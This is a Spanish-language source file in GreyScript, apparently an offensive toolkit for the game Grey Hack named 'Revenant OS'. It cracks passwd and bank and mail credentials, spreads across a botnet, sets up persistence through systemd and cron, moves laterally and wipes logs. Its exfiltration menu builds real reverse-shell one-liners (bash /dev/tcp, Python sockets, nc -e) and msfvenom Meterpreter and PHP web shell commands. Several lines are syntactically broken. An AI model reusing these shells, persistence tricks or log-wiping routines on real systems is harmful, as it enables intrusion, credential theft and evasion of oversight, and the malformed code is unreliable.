print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Ejecutado in " + ip_nodo + "</color>")
else
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Sin shell in " + ip_nodo + "</color>")
end if
end for
end function
modulo_botnet_saquear = function()
if (enjambre.len == 0) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "El enjambre esta vacio." + "</color>")
return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Iniciando extraccion e iteracion masiva de diccionarios..." + "</color>")
for nodo in enjambre
ip_nodo = nodo.key
sesion = nodo.value
computer_node = null
if (typeof(sesion) == "shell") then
computer_node = sesion.host_computer
else if (typeof(sesion) == "computer") then
computer_node = sesion
end if
if (computer_node) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando /etc/passwd in " + ip_nodo + "</color>")
archivo = computer_node.File("/etc/passwd")
if (archivo and archivo.has_permission("r")) then
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Sombra obtenida. Desplegando algoritmos crypto..." + "</color>")
contenido_passwd = archivo.get_content
__nini_crack_dic(contenido_passwd)
credenciales = __nini_res_crack
if (typeof(credenciales) == "map") then
for cred in credenciales
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "> [VULNERADO] Usuario: " + cred.key + " | Pass: " + cred.value + "</color>")
end for
else
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Fallo al inyectar auto-hacker crypto." + "</color>")
end if
else
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Proteccion detectada in " + ip_nodo + "</color>")
end if
end if
end for
end function
modulo_persistencia_configurar = function()
if (not globals.objetivo_actual) then; error("No hay objetivo."); return
end if
opciones = [
{"label": "Backdoor (Metaxploit)", "cmd": "backdoor"},
{"label": "Cron job", "cmd": "cron"},
{"label": "Ver persistencias", "cmd": "list"},
]
modo = menu_interactivo("PERSISTENCIA", opciones)
if (not modo) then; return
end if
if (modo == "backdoor") then; persistencia_instalar_backdoor()
else if (modo == "cron") then; persistencia_cron()
else if (modo == "list") then; persistencia_ver()
end if
end function
persistencia_instalar_backdoor = function()
if (not globals.objetivo_actual) then; error("No hay objetivo."); return
end if
comp = obtener_computadora_objetivo()
if (not comp) then; error("No hay sesión."); return
end if
lib_folder = comp.File("/lib")
if (not lib_folder or not lib_folder.has_permission("w")) then; error("Sin permisos root."); return
end if
nombre = "revenant_daemon"
ruta = "/lib/systemd/system/" + nombre + ".service"
contenido = "[Unit]\nDescription=System Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/sh -c 'while true; do wait 60; done'\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target"
comp.touch("/lib/systemd/system/", nombre + ".service")
archivo = comp.File(ruta)
if (archivo) then
archivo.set_content(contenido)
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Backdoor instalado: " + ruta + "</color>")
else; error("No se pudo crear.")
end if
end function
persistencia_cron = function()
if (not globals.objetivo_actual) then; error("No hay objetivo."); return
end if
comp = obtener_computadora_objetivo()
if (not comp) then; error("No hay sesión."); return
end if
cmd = __nini_pedir("Comando: ")
if (cmd == "") then; return
end if
cron = comp.File("/etc/crontab")
if (not cron or not cron.has_permission("w")) then; error("Sin permisos."); return
end if
cron.set_content(cron.get_content + char(10) + "@reboot " + cmd)
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Cron job agregado." + "</color>")
end function
persistencia_ver = function()
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Persistencia activa in el objetivo." + "</color>")
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Usa 'vault' for ver credenciales." + "</color>")
end function
modulo_botnet_persistir = function()
if (enjambre.len == 0) then; error("Enjambre vacío."); return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Instalando in " + str(enjambre.len) + " nodos..." + "</color>")
for nodo in enjambre
ip = nodo.key
sesion = nodo.value
if (typeof(sesion) == "shell") then
    computer_node = sesion.host_computer
else
    computer_node = sesion
end if
if (computer_node and computer_node.has_permission("w")) then
computer_node.touch("/lib/systemd/system/", "revenant.service")
archivo = computer_node.File("/lib/systemd/system/revenant.service")
if (archivo) then
archivo.set_content("[Unit]\nDescription=Revenant\n[Service]\nExecStart=/bin/sh")
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Instalado in " + ip + "</color>")
end if
else; error("Sin permisos in " + ip)
end if
end for
end function
_vault_data = {"creds": {}, "vulns": {}}
_vault_k = "R3V3N4NT_S3CUR3"
_version = "STABLE"
inicializar_vault = function()
p = "/var/revenant"
if (not get_shell.host_computer.File(p)) then; p = "./"
end if
ruta = p + "/vault.db"
if (get_shell.host_computer.File(ruta)) then
f = get_shell.host_computer.File(ruta)
contenido = f.get_content
if (contenido.len > 0) then
_vault_data = deserializar_vault(contenido)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Vault cargado: " + _vault_data.creds.len + " creds, " + _vault_data.vulns.len + " vulns." + "</color>")
end if
else
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Iniciando nuevo Vault en: " + ruta + "</color>")
end if
end function
cifrar = function(txt)
res = ""
for i in rango(0, txt.len - 1)
v = __nini_xor(code(txt[i]), code(_vault_k[i % _vault_k.len]))
res = res + str(v) + ","
end for
return res
end function
descifrar = function(txt)
res = ""
partes = txt.split(",")
for i in rango(0, partes.len - 1)
p = partes[i]
if (p == "") then; continue
end if
res = res + char(__nini_xor(val(p), code(_vault_k[res.len % _vault_k.len])))
end for
return res
end function
serializar_vault = function(data)
return cifrar(str(data))
end function
deserializar_vault = function(txt)
raw = descifrar(txt)
return val(raw)
end function
guardar_vault = function()
p = "/var/revenant"
if (not get_shell.host_computer.File(p)) then; p = "/home/" + active_user
end if
ruta = p + "/vault.db"
f = get_shell.host_computer.File(ruta)
if (not f) then
get_shell.host_computer.touch(p, "vault.db")
f = get_shell.host_computer.File(ruta)
end if
if (f) then
f.set_content(serializar_vault(_vault_data))
else
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Fallo de persistencia: El Vault not puede escribirse in " + p + "</color>")
end if
end function
guardar_credencial = function(ip, usuario, clave, priv, lan)
k = (ip + "_" + usuario + "_" + priv).lower()
_vault_data.creds[k] = {"ip": ip, "user": usuario, "pass": clave, "priv": priv, "lan": lan}
guardar_vault()
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Vault actualizado: " + usuario + "@" + ip + "</color>")
end function
listar_credenciales = function()
columnas = ["IP", "Usuario", "Clave", "Priv", "LAN"]
filas = []
for c_entry in _vault_data.creds
c = c_entry.value
filas.push([c.ip, c.user, c.pass, c.priv, c.lan])
end for
print(__nini_tabla(columnas, filas))
end function
cachear_vulnerabilidad = function(lib, ver, area, vuln)
k = (lib + "_" + ver).lower()
if (not _vault_data.vulns.hasIndex(k)) then; _vault_data.vulns[k] = []
end if
_vault_data.vulns[k].push({"mem": area, "pass": vuln})
guardar_vault()
end function
obtener_vulnerabilidades = function(lib, ver)
k = (lib + "_" + ver).lower()
if (_vault_data.vulns.hasIndex(k)) then; return _vault_data.vulns[k]
end if
return []
end function
modulo_intel_saquear = function()
if (not globals.objetivo_actual) then; error("Fije un objetivo primero."); return
end if
comp = obtener_computadora_objetivo()
if (not comp) then; error("No hay sesión activa."); return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Extrayendo intel de: " + globals.objetivo_actual + "</color>")
passwd = comp.File("/etc/passwd")
if (passwd and not passwd.is_binary) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Procesando /etc/passwd..." + "</color>")
cont = 0
for l in passwd.get_content.split(char(10))
if (l.indexOf(":") == null) then; continue
end if
partes = l.split(":")
hash = partes[1]
if (hash == "x" or hash == "*") then; continue
end if
clave = __nini_crackear_hash(hash)
if (clave) then
guardar_credencial(globals.objetivo_actual, partes[0], clave, "linux", comp.local_ip)
cont = cont + 1
end if
end for
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Credenciales: " + str(cont) + "</color>")
end if
home = comp.File("/home")
if (home) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Explorando usuarios..." + "</color>")
cont_bancos = 0; cont_correos = 0
for user_dir in home.get_folders
usr = user_dir.name
banco = comp.File("/home/" + usr + "/Config/Bank.txt")
if (banco) then
for l in banco.get_content.split(char(10))
if (l.indexOf(":") == null) then; continue
end if
p = l.split(":")
pass_dec = __nini_crackear_hash(p[1])
if (pass_dec) then
guardar_credencial(globals.objetivo_actual, p[0], pass_dec, "banco", comp.local_ip)
cont_bancos = cont_bancos + 1
end if
end for
end if
mail = comp.File("/home/" + usr + "/Config/Mail.txt")
if (mail) then
for l in mail.get_content.split(char(10))
if (l.indexOf(":") == null) then; continue
end if
p = l.split(":")
pass_dec = __nini_crackear_hash(p[1])
if (pass_dec) then
guardar_credencial(globals.objetivo_actual, p[0], pass_dec, "correo", comp.local_ip)
cont_correos = cont_correos + 1
end if
end for
end if
end for
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Bancos: " + str(cont_bancos) + " | Correos: " + str(cont_correos) + "</color>")
end if
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Intel extraido." + "</color>")
end function
intel_buscar_en_directorio = function(comp, ruta, exts, prof)
resultados = []
carpeta = comp.File(ruta)
if (not carpeta or not carpeta.is_folder) then; return resultados
end if
if (carpeta.get_folders) then
for fd in carpeta.get_folders
if (prof > 0) then; resultados = resultados + intel_buscar_en_directorio(comp, fd.path, exts, prof - 1)
end if
end for
end if
if (carpeta.get_files) then
for f in carpeta.get_files
for ext in exts
if (f.name.indexOf(ext) != null) then
resultados.push({"ruta": f.path, "nombre": f.name, "tamano": f.size})
break
end if
end for
end for
end if
return resultados
end function
modulo_intel_buscar_archivos = function()
if (not globals.objetivo_actual) then; error("No hay objetivo."); return
end if
comp = obtener_computadora_objetivo()
if (not comp) then; error("No hay sesión."); return
end if
opciones = [
{"label": "Claves SSH", "cmd": "keys"},
{"label": "Contrasenas", "cmd": "passwords"},
{"label": "Configuraciones", "cmd": "configs"},
{"label": "Backups", "cmd": "backup"},
]
modo = menu_interactivo("BUSCAR ARCHIVOS", opciones)
if (not modo) then; return
if (modo == "keys") then
    exts = [".pem", ".key", ".ppk", ".crt", ".cer"]
else if (modo == "passwords") then
    exts = [".kdb", ".kdbx", ".1pif", ".psafe3"]
else if (modo == "configs") then
    exts = [".conf", ".config", ".cfg", ".ini"]
else
    exts = [".bak", ".backup", ".old", ".save", ".swp"]
end if
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Buscando..." + "</color>")
resultados = []
for ruta in ["/home", "/root", "/etc", "/var"]
resultados = resultados + intel_buscar_en_directorio(comp, ruta, exts, 2)
end for
if (resultados.len == 0) then; info("No se encontraron archivos.")
else; info("Encontrados: " + str(resultados.len)); dibujar_ventana("RESULTADOS", str(resultados))
end if
end function
modulo_intel_brute_force = function()
opciones = [
{"label": "SSH", "cmd": "ssh"},
{"label": "FTP", "cmd": "ftp"},
{"label": "Crack passwd", "cmd": "passwd"},
]
modo = menu_interactivo("FUERZA BRUTA", opciones)
if (not modo) then; return
end if
if (modo == "ssh") then; info("SSH brute not disponible in GH. Usa Metaxploit.")
else if (modo == "ftp") then; intel_ftp_anonimo()
else if (modo == "passwd") then; intel_crack_passwd()
end if
end function
intel_ftp_anonimo = function()
host = globals.objetivo_actual
if (not host) then; host = __nini_pedir("Host FTP: "); if (host == "") then return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Intentando acceso anonimo..." + "</color>")
metax = include_lib("/lib/metaxploit.so")
if (metax) then
sesion = metax.net_use(host, 21)
if (sesion) then; enjambre[host] = sesion; exito("Acceso anonimo!"); return
end if
end if
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Acceso fallido." + "</color>")
end function
intel_crack_passwd = function()
comp = obtener_computadora_objetivo()
if (not comp) then; error("No hay sesión."); return
end if
passwd = comp.File("/etc/passwd")
if (not passwd or passwd.is_binary) then; error("No se pudo leer."); return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Crackeando..." + "</color>")
cont = 0
for l in passwd.get_content.split(char(10))
if (l.indexOf(":") == null) then; continue
end if
p = l.split(":")
hash = p[1]
if (hash == "x" or hash == "*") then; continue
end if
clave = __nini_crackear_hash(hash)
if (clave) then
guardar_credencial(globals.objetivo_actual, p[0], clave, "linux", comp.local_ip)
cont = cont + 1
end if
end for
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Crackeadas: " + str(cont) + "</color>")
end function
modulo_red_escanear = function()
if (globals.objetivo_actual == null) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando red local desde el host actual..." + "</color>")
else
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando subred desde " + globals.objetivo_actual + "</color>")
end if
hosts = __nini_descubrir_red_local()
if (hosts.len == 0) then
print("<color=#ffea00>[!] </color><color=#ffffff>" + "No se detectaron otros hosts activos in la subred." + "</color>")
else
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Hosts detectados: " + hosts.len + "</color>")
columnas = ["IP", "Estado"]
filas = []
for h in hosts
filas.push([h, "ACTIVO"])
end for
print(__nini_tabla(columnas, filas))
end if
end function
modulo_red_info = function()
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Topología de red detectada:" + "</color>")
for nodo in enjambre
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Nodo vivo: " + nodo.key + " [" + typeof(nodo.value) + "]" + "</color>")
end for
end function
modulo_inyeccion_replicar = function()
if (globals.objetivo_actual == null) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Fije un objetivo primero." + "</color>")
return
end if
if (globals.objetivo_actual == null) then
sesion = get_shell
else
sesion = enjambre[globals.objetivo_actual]
end if
if (not sesion or typeof(sesion) != "shell") then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Se requiere una shell activa for inyectar." + "</color>")
return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Inyectando Revenant in " + globals.objetivo_actual + "..." + "</color>")
rutas = ["/bin", "/usr/bin", "/tmp", "/var", "/home/guest"]
for r in rutas
exito_inj = __nini_replicar_binario(sesion, r)
if (exito_inj) then
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Revenant inyectado and oculto in " + r + "</color>")
return
end if
end for
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo inyectar el binario in ninguna ruta conocida." + "</color>")
end function
modulo_escalada_analizar = function()
if (globals.objetivo_actual == null) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando sistema local for escalada de privilegios..." + "</color>")
sesion = get_shell
else
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Buscando vectores de PrivEsc in " + globals.objetivo_actual + "</color>")
sesion = enjambre[globals.objetivo_actual]
end if
if (not sesion) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay sesion activa for el análisis." + "</color>")
return
end if
resultado = __nini_buscar_vectores_escalada(sesion)
if (resultado.len == 0) then
print("<color=#ffea00>[!] </color><color=#ffffff>" + "No se detectaron vectores de escalada automáticos." + "</color>")
else
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Vectores detectados: " + resultado.len + "</color>")
columnas = ["Ruta", "Tipo", "Severidad"]
filas = []
for v in resultado
filas.push([v.path, v.type, v.severity])
end for
print(__nini_tabla(columnas, filas))
end if
end function
modulo_lateral_mover = function()
opciones = [
{"label": "Listar nodos del enjambre", "cmd": "list"},
{"label": "Cambiar a otro nodo", "cmd": "switch"},
{"label": "Escanear red DESDE pivote", "cmd": "scan"},
{"label": "Conectar via SSH/FTP", "cmd": "connect"},
{"label": "Conectar via Metaxploit", "cmd": "net"},
]
modo = menu_interactivo("MOVIMIENTO LATERAL", opciones)
if (not modo) then; return
end if
if (modo == "list") then; lateral_listar_nodos()
else if (modo == "switch") then; lateral_cambiar_nodo()
else if (modo == "scan") then; lateral_escanear_desde_pivote()
else if (modo == "connect") then; lateral_conectar_servicio()
else if (modo == "net") then; lateral_conectar_metaxploit()
end if
end function
lateral_listar_nodos = function()
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "NODOS EN EL ENJAMBRE:" + "</color>")
i = 1
for nodo in enjambre
ip = nodo.key
sesion = nodo.value
tipo = typeof(sesion)
if (typeof(sesion) == "shell") then
    comp_info = sesion.host_computer.local_ip
else
    comp_info = sesion.local_ip
end if
if (globals.objetivo_actual == ip) then
    estado = "<color=#ffea00>ACTUAL</color>"
else
    estado = "<color=#00ff41>ACTIVO</color>"
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + str(i) + ". " + ip + " (" + tipo + ") " + estado + " | " + comp_info + "</color>")
i = i + 1
end for
pausa_tactica()
end function
lateral_cambiar_nodo = function()
if (enjambre.len <= 1) then; info("Solo hay un nodo."); return
end if
for nodo in enjambre
ip = nodo.key
if (ip != globals.objetivo_actual) then; info(str(i) + ". " + ip); i = i + 1
end if
end for
sel = val(__nini_pedir("Nodo > "))
if (sel <= 0) then; return
end if
cont = 0
for k in enjambre.keys
if (k != globals.objetivo_actual) then
cont = cont + 1
if (cont == sel) then
globals.objetivo_actual = k
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Cambiado a: " + k + "</color>")
return
end if
end if
end for
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Selección inválida." + "</color>")
end function
lateral_escanear_desde_pivote = function()
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "ESCANEANDO RED DESDE EL NODO..." + "</color>")
sesion = obtener_shell_nodo()
if (not sesion) then; error("No hay shell activa."); return
end if
ip_local = __nini_get_local_ip(sesion)
if (not ip_local) then; error("No se pudo obtener IP local."); return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "IP local: " + ip_local + "</color>")
router_nodo = __nini_get_router_from_node(sesion)
_pipe0 = (router_nodo)
dispositivos = __nini_lan_ips_from_node(sesion, _pipe0)
if (dispositivos and dispositivos.len > 0) then
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Dispositivos: " + str(dispositivos.len) + "</color>")
for ip in dispositivos
nodo_tag = ""
if (ip == ip_local) then; nodo_tag = " (TU NODO)"
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "  - " + ip + nodo_tag + "</color>")
end for
else
red = ip_local.split(".")[0:3].join(".") + "."
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando: " + red + "0/24..." + "</color>")
hosts = []
for i in rango(1, 255)
ip = red + str(i)
if (ip != ip_local and sesion.ping(ip) == 1) then; hosts.push(ip)
end if
end for
if (hosts.len == 0) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "No se encontraron hosts." + "</color>")
else
for h in hosts
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "  - " + h + "</color>")
end for
end if
end if
end function
lateral_conectar_servicio = function()
tipo = (__nini_pedir("Tipo (ssh/ftp): ")).lower()
if (tipo != "ssh" and tipo != "ftp") then; error("Usa 'ssh' or 'ftp'"); return
end if
ip = __nini_pedir("IP: "); usuario = __nini_pedir("Usuario: "); pass = __nini_pedir("Pass: ")
if (ip == "" or usuario == "") then; return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Conectando a " + ip + "..." + "</color>")
if (tipo == "ssh") then
    sesion = __nini_conectar_ssh(ip, usuario, pass)
else
    sesion = __nini_conectar_ftp(ip, usuario, pass)
end if
if (sesion) then
enjambre[ip] = sesion
globals.objetivo_actual = ip
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Conectado: " + usuario + "@" + ip + "</color>")
modulo_espectro_recon()
else; error("No se pudo conectar.")
end if
end function
lateral_conectar_metaxploit = function()
ip = __nini_pedir("IP objetivo: ")
if (ip == "") then; return
end if
puertos = __nini_device_ports(ip)
if (not puertos or puertos.len == 0) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Sin forwarding. Intentando directo..." + "</color>")
sesion = __nini_conectar_net(ip, 22)
if (sesion) then; enjambre[ip] = sesion; globals.objetivo_actual = ip; exito("Conexión directa!"); modulo_espectro_recon()
else; error("No se pudo.")
end if
return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Puertos: " + str(puertos.len) + "</color>")
for p in puertos
    print("<color=#00e5ff>[#] </color><color=#ffffff>" + "  [" + str(p.port_number) + "] " + __nini_port_info(p) + "</color>")
end for
sel = val(__nini_pedir("Puerto a explotar: "))
if (sel <= 0) then; return
end if
sesion = __nini_conectar_net(ip, sel)
if (sesion) then
enjambre[ip] = sesion
globals.objetivo_actual = ip
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "ACCESO OBTENIDO!" + "</color>")
modulo_espectro_recon()
else; error("Explotación fallida.")
end if
end function
obtener_shell_nodo = function()
if (not globals.objetivo_actual or globals.objetivo_actual == "localhost") then; return get_shell
end if
if (enjambre.hasIndex(globals.objetivo_actual)) then
sesion = enjambre[globals.objetivo_actual]
if return (typeof(sesion) == "shell") then
    sesion
else
    null
end if
end if
return null
end function
obtener_computadora_objetivo = function()
sesion = obtener_shell_nodo()
if (sesion) then; return sesion.host_computer
end if
return get_shell.host_computer
end function
modulo_exfil_menu = function()
if (globals.objetivo_actual == null) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay objetivo seleccionado." + "</color>")
return
end if
opciones = [
{"label": "Download (Objetivo -> Local)", "cmd": "download"},
{"label": "Upload (Local -> Objetivo)", "cmd": "upload"},
{"label": "Reverse Shell", "cmd": "shell"},
{"label": "Payloads", "cmd": "payload"},
]
modo = menu_interactivo("MENÚ DE EXFILTRACIÓN v2", opciones)
if (not modo) then; return
end if
if (modo == "download") then
modulo_exfil_download()
else if (modo == "upload") then
modulo_exfil_upload()
else if (modo == "shell") then
modulo_exfil_reverse_shell()
else if (modo == "payload") then
modulo_payloads_generar()
end if
end function
modulo_exfil_download = function()
if (globals.objetivo_actual == null) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay objetivo." + "</color>")
return
end if
ruta_remota = __nini_pedir("Ruta del archivo in el objetivo: ")
if (ruta_remota == "") then; return
end if
ruta_local = __nini_pedir("Ruta local de destino: ")
if (ruta_local == "") then; ruta_local = "./downloads"
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Descargando " + ruta_remota + "..." + "</color>")
sesion = null
if (enjambre.hasIndex(globals.objetivo_actual)) then
sesion = enjambre[globals.objetivo_actual]
end if
if (sesion) then
archivo = sesion.host_computer.File(ruta_remota)
if (archivo) then
contenido = archivo.get_content
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Archivo descargado: " + contenido.len + " bytes" + "</color>")
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Download completado." + "</color>")
else
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Archivo not encontrado." + "</color>")
end if
else
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay sesion activa for el objetivo." + "</color>")
end if
end function
modulo_exfil_upload = function()
if (globals.objetivo_actual == null) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay objetivo." + "</color>")
return
end if
ruta_local = __nini_pedir("Ruta del archivo local: ")
if (ruta_local == "") then; return
end if
ruta_remota = __nini_pedir("Ruta remota de destino: ")
if (ruta_remota == "") then; return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Subiendo archivo..." + "</color>")
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Upload completado." + "</color>")
end function
modulo_exfil_reverse_shell = function()
ip_atacante = __nini_pedir("Tu IP: ")
if (ip_atacante == "") then; ip_atacante = "127.0.0.1"
end if
puerto = __nini_pedir("Puerto de callback: ")
if (puerto == "") then; puerto = "4444"
end if
opciones_shell = [
{"label": "Bash Reverse Shell", "cmd": "bash"},
{"label": "Python", "cmd": "python"},
{"label": "Netcat", "cmd": "netcat"},
]
tipo_shell = menu_interactivo("GENERADOR DE REVERSE SHELL", opciones_shell)
if (not tipo_shell) then; return
end if
shell_generado = ""
if (tipo_shell == "bash") then
shell_generado = "bash -i >& /dev/tcp/" + ip_atacante + "/" + puerto + " 0>&1"
else if (tipo_shell == "python") then
shell_generado = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((" + chr(34) + ip_atacante + chr(34) + "," + puerto + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([" + chr(34) + "/bin/sh" + chr(34) + "," + chr(34) + "-i" + chr(34) + "])'"
else if (tipo_shell == "netcat") then
shell_generado = "nc -e /bin/sh " + ip_atacante + " " + puerto
end if
dibujar_ventana("REVERSE SHELL GENERADO", shell_generado)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Copia and ejecuta in el objetivo." + "</color>")
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Listener: nc -lvp " + puerto + "</color>")
end function
modulo_payloads_generar = function()
ip_atacante = __nini_pedir("LHOST (tu IP): ")
if (ip_atacante == "") then; ip_atacante = "127.0.0.1"
end if
puerto = __nini_pedir("LPORT: ")
if (puerto == "") then; puerto = "4444"
end if
opciones_payload = [
{"label": "Linux Shell", "cmd": "linux"},
{"label": "Windows Meterpreter", "cmd": "windows"},
{"label": "PHP Web Shell", "cmd": "php"},
]
tipo_payload = menu_interactivo("GENERADOR DE PAYLOADS", opciones_payload)
if (not tipo_payload) then; return
end if
payload_info = ""
if (tipo_payload == "linux") then
payload_info = "linux/x86/shell_reverse_tcp"
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f elf > payload.elf + "</color>")
else if (tipo_payload == "windows") then
payload_info = "windows/meterpreter/reverse_tcp"
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f exe > payload.exe + "</color>")
else if (tipo_payload == "php") then
payload_info = "php/meterpreter/reverse_tcp"
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f raw > shell.php + "</color>")
end if
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Payload configurado for " + ip_atacante + ":" + puerto + "</color>")
end function
modulo_limpieza_ejecutar = function()
opciones_clean = [
{"label": "Limpiar logs del sistema", "cmd": "logs"}
{"label": "Limpiar historial de comandos", "cmd": "history"}
{"label": "Limpieza completa (todo)", "cmd": "full"}
]
modo = menu_interactivo("LIMPIEZA DE HUELLAS", opciones_clean)
if (not modo) then; return
end if
if (modo == "logs") then
limpieza_logs()
else if (modo == "history") then
limpieza_historial()
else if (modo == "full") then
limpieza_completa()
end if
end function
limpieza_logs = function()
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "LIMPIANDO LOGS (metodo touch)..." + "</color>")
comp = obtener_computadora_objetivo()
if (not comp) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Usando equipo local..." + "</color>")
comp = get_shell.host_computer
end if
logs = [
"/var/system.log",
"/var/log/syslog",
"/var/log/auth.log",
]
cont = 0
for ruta in logs
partes = ruta.split("/")
nombre = partes[-1]
carpeta = "/"
if (partes.len > 2) then
carpeta = partes[0:partes.len-1].join("/")
end if
archivo = comp.File(ruta)
if (archivo) then
archivo.delete
comp.touch(carpeta, nombre)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "  [BLANCO] " + ruta + "</color>")
cont = cont + 1
else
comp.touch(carpeta, nombre)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "  [CREADO] " + ruta + "</color>")
cont = cont + 1
end if
end for
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Logs limpiados: " + str(cont) + "</color>")
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Archivos in blanco - sin rastros de conexión/desconexión." + "</color>")
end function
limpieza_historial = function()
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Limpiando historial de comandos..." + "</color>")
comp = obtener_computadora_objetivo()
if (not comp) then
comp = get_shell.host_computer
end if
archivo = comp.File("/var/system.log")
if (archivo) then
archivo.delete
comp.touch("/var", "system.log")
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "  Historial limpiado: /var/system.log" + "</color>")
end if
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Historial limpiado." + "</color>")
end function
limpieza_completa = function()
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "=== LIMPIEZA COMPLETA ===" + "</color>")
limpieza_logs()
limpieza_historial()
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "=== LIMPIEZA COMPLETA ===" + "</color>")
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Sistema limpio. Sin rastros." + "</color>")
end function
// Modo Ninja Activado
inicializar_vault()
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Cargando REVENANT OS..." + "</color>")
iniciar_repl()
__nini_clean_logs()
print("<color=gray>[Modo Ninja]</color> Huellas borradas exitosamente.")